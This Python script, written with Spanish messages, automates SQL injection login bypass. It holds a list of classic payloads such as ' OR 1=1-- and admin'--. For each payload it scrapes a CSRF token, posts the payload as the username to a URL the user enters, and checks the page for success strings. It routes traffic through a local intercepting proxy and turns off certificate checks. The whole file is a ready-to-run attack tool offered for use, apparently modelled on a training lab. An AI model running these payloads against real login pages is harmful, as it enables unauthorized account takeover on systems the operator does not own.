import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

sqli_payloads = [
    "admin'--",
    "administrator'--",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "admin' OR '1'='1",
    "admin'--",
    "admin' OR '1'='1'--",
    "' OR '1'='1'--",
    "1' OR '1'='1'--",
    "' OR 'x'='x",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'/*",
    "admin' OR 1=1--",
]

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')

    csrf_input = soup.find("input", {"name": "csrf"})
    
    if csrf_input:
        csrf = csrf_input.get('value')
        print(f"CSRF token encontrado: {csrf}")
        return csrf
    else:
        print("No se encontró el campo CSRF en la página.")
        return None

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)

    if csrf is None:
        print("[-] No se pudo obtener el token CSRF.")
        return False

    data = {"csrf": csrf,
            "username": payload,
            "password": "randomtext"}

    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text

    success_messages = ["Log out", "home", "hola", "bienvenido", "dashboard", "perfil", "inicio"]

    if any(message in res for message in success_messages):
        return True
    else:
        return False


if __name__ == "__main__":
    url = input("Ingrese la URL que desea escanear: ").strip()

    s = requests.Session()

    for payload in sqli_payloads:
        print(f"Probando con el payload: {payload}")
        if exploit_sqli(s, url, payload):
            print(f'[+] ¡SQL injection exitosa con el payload "{payload}"! Hemos iniciado sesión como el usuario administrador.')
            break
    else:
        print('[-] Todas las inyecciones SQL fallaron.')
